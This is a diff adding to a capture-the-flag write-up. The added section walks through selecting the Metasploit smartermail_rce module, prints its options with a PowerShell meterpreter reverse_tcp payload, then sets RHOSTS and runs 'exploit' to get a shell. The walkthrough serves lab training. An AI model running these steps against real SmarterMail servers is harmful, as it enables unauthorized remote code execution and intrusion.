@@ -690,13 +690,69 @@ You will get the following
 
 ![Smartermail search results](../../Assets/PwnToOwn/metasploit_smartermail.png)
 
-now using the `use 0` command will select the smartermail exploit. 
-> The reason we are using 0 and not 1 is because 1 seems to be a post module 
-> denoted by the file path `/post/windows` 
-> 
+now using the `use 0` command will select the smartermail exploit. To see what
+we need to set to exploit the smartermail, We can use the `Show options` 
+command
 
-Now we should see what need to input for the exploit to work. 
-`info or show options` will complete
+```bash
+msf6 exploit(windows/http/smartermail_rce) > show options
+
+Module options (exploit/windows/http/smartermail_rce):
+
+   Name       Current Setting  Required  Description
+   ----       ---------------  --------  -----------
+   ENDPOINT   Servers          yes       Choose one of three exposed endpoints: Servers, Spool, and Mail. Example - tcp://127.0.0.1:17001/Servers
+   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
+   RPORT      9998             yes       SmarterMail default HTTP port (TCP)
+   SSL        false            no        Negotiate SSL/TLS for outgoing connections
+   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
+   TARGETURI  /                yes       Base path
+   TCP_PORT   17001            yes       SmarterMail default .NET remoting port
+   URIPATH                     no        The URI to use for this exploit (default is random)
+   VHOST                       no        HTTP server virtual host
+
+
+   When CMDSTAGER::FLAVOR is one of auto,tftp,wget,curl,fetch,lwprequest,psh_invokewebrequest,ftp_http:
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
+   SRVPORT  8080             yes       The local port to listen on.
+
+
+Payload options (cmd/windows/powershell/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST                      yes       The listen address (an interface may be specified)
+   LPORT     4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Windows Command
+
+
+
+View the full module info with the info, or info -d command.
+```
+Looks like we need to change RHOSTS and LHOST with the `set` command. 
+
+Example
+
+```bash
+set RHOSTS <IP>
+```
+Now that we have our settings set. Now we can exploit the machine with the 
+`exploit` command 
+
+![Exploit works]()
+
+Now that we are in the system now we can look around and [get the flag](#getting-the-flag)
 
 #### Manual Exploitation  
 
